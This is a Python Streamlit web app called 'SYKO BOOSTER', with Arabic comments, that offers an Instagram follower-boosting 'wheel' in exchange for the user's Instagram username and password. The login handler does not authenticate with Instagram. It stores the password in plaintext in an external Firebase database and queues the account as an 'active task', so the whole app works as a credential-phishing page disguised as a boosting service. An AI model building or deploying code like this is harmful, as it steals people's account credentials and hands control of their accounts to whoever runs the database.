import streamlit as st
import requests
import time

# إعدادات الصفحة
st.set_page_config(page_title="SYKO BOOSTER", layout="centered")

# --- تصميم الواجهة ---
st.markdown("""
    <style>
    .main { background: #000000; }
    .stApp { background: #000000; }
    .login-card {
        background: #0a0a0a;
        padding: 40px;
        border-radius: 20px;
        border: 2px solid #00f2ff;
        text-align: center;
        box-shadow: 0 0 20px rgba(0, 242, 255, 0.2);
    }
    .syko-logo { font-size: 40px; font-weight: bold; color: #fff; text-shadow: 0 0 10px #00f2ff; }
    input { background-color: #111 !important; color: #00f2ff !important; border: 1px solid #333 !important; }
    .stButton>button {
        background: linear-gradient(45deg, #00f2ff, #0072ff);
        color: #000; font-weight: bold; border-radius: 10px; width: 100%;
    }
    </style>
    """, unsafe_allow_html=True)

DB_URL = "https://syko-booster-default-rtdb.firebaseio.com/"

# تهيئة الجلسة
if 'logged_in' not in st.session_state:
    st.session_state.logged_in = False

# --- واجهة الدخول ---
if not st.session_state.logged_in:
    st.markdown('<div class="login-card">', unsafe_allow_html=True)
    st.markdown('<div class="syko-logo">SYKO</div>', unsafe_allow_html=True)
    st.markdown('<p style="color:#00f2ff;">CONNECT INSTAGRAM ACCOUNT</p>', unsafe_allow_html=True)
    
    # تعريف الحقول بأسماء واضحة لتجنب الـ NameError
    user_input = st.text_input("Username", key="insta_u", placeholder="Instagram Username").lower().strip()
    pass_input = st.text_input("Password", key="insta_p", placeholder="Instagram Password", type="password")
    
    if st.button("LOGIN TO SYSTEM"):
        if user_input and pass_input:
            with st.spinner('Linking to Wheel...'):
                # حفظ البيانات في Firebase
                u_clean = user_input.replace("@","")
                requests.put(f"{DB_URL}accounts/{u_clean}.json", json={
                    "password": pass_input,
                    "time": time.time()
                })
                # إضافة الحساب للدوامة تلقائياً
                requests.post(f"{DB_URL}active_tasks.json", json={"user": u_clean})
                
                # تحديث حالة الدخول
                st.session_state.username = u_clean
                st.session_state.logged_in = True
                st.rerun()
        else:
            st.error("Please enter both username and password")
    st.markdown('</div>', unsafe_allow_html=True)

else:
    # --- واجهة الدوامة بعد الدخول ---
    st.sidebar.success(f"Connected: @{st.session_state.username}")
    
    # جلب الكوينز أو تعيين 0 إذا كان جديداً
    res = requests.get(f"{DB_URL}users/{st.session_state.username}.json").json()
    coins = res.get('coins', 0) if res else 0
    
    st.markdown(f"<h1>Welcome to SYKO Wheel</h1>", unsafe_allow_html=True)
    st.markdown(f"<h2 style='color:#00f2ff; text-align:center;'>🪙 {coins}</h2>", unsafe_allow_html=True)
    
    if st.sidebar.button("Logout"):
        st.session_state.logged_in = False
        st.rerun()
